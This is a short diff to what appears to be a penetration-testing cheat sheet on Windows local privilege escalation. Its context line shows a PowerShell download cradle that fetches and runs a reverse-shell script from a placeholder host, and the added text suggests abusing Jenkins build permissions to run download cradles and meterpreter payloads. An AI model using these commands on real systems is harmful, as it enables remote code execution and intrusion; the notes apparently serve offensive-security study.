@@ -397,8 +397,7 @@ Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 # Local privilege escalation
 Focusing on Service issues
 
-*Only target Services you can restart.*
-*Also, do not target an unqouted service path abuse when it would require dropping the .exe in C:\  - you need local admin rights to write there.
+*Only target Services you can restart. Also, do not target an unqouted service path abuse when it would require dropping the .exe in C:\  - you need local admin rights to write there.*
 #### WinPeas
 https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 
@@ -438,7 +437,8 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
 ####  Jekins
 ```
 Runs as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure
-Execute windows or shell comand into the build, you can also use powershell scripts
+Execute windows or shell comand into the build, you can also use download cradles to execute powershell scripts. You can also execute
+meterpreter payloads or anything you like.
 ```
 
 ### Add user to local admin and RDP group and enable RDP on firewall
